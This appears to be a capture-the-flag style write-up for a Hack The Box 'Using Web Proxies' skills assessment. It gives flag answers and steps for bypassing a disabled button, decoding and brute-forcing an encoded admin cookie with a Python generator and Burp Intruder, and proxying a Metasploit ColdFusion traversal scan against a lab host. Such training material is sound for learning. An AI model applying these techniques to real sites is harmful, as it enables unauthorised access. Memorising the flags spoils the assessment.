# Skills Assessment - Using Web Proxies
## Questions
1. The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag. **Answer: HTB{d154bl3d_bu770n5_w0n7_570p_m3}**

   - Use Burp's **Match and Replace** to replace `disabled` with an empty string. Now visit `/lucky.php` and click the button. On the 3rd POST request, the flag reveals.

2. The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer. **Answer: 3dac93b8cd250aa8c1a36fffc79a17a**
   
   - Visit the `/admin.php` to obtain a cookie value: `4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d`
   - Go to Burp's **Decoder**, decode it with `ASCII hex → Base64` to reveal the 31-character value
  
3. Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload) **Answer: HTB{burp_1n7rud3r_n1nj4!}**
   
   - Use this simple script to create a list of `ASCII_HEX(BASE64_ENCODE(md5_string))` where md5_string is the filled version of the original missing 1 character string:
        ```python
        import base64

        prefix = "3dac93b8cd250aa8c1a36fffc79a17a"
        hex_chars = "0123456789abcdef"

        for char in hex_chars:
            md5_string = prefix + char
            b64_encoded = base64.b64encode(md5_string.encode("ascii")).decode("ascii")
            ascii_hex = b64_encoded.encode("ascii").hex()

            print(ascii_hex)
        ```
   - Use the generated results for Burp's Intruder and found 1 response with shortest length, this is the one containing the flag
4. You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'? **Answer: CFIDE**
   
   - Use the module with proxy configured through Burp's listener at 127.0.0.1:8080:
        ```
        [msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> options

        Module options (auxiliary/scanner/http/coldfusion_locale_traversal):

        Name         Current Setting      Required  Description
        ----         ---------------      --------  -----------
        FILE                              no        File to retrieve
        FINGERPRINT  false                yes       Only fingerprint endpoints
        Proxies      http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, sapni, socks5h, http
        RHOSTS       154.57.164.82        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
        RPORT        32745                yes       The target port (TCP)
        SSL          false                no        Negotiate SSL/TLS for outgoing connections
        THREADS      1                    yes       The number of concurrent threads (max one per host)
        VHOST                             no        HTTP server virtual host


        View the full module info with the info, or info -d command.

        [msf](Jobs:0 Agents:0) auxiliary(scanner/http/coldfusion_locale_traversal) >> run
        ```
   - Read the request in the History tab for the answer:
        ```
        GET /CFIDE/administrator/index.cfm HTTP/1.1
        Host: 154.57.164.82:32745
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
        Connection: keep-alive
        ```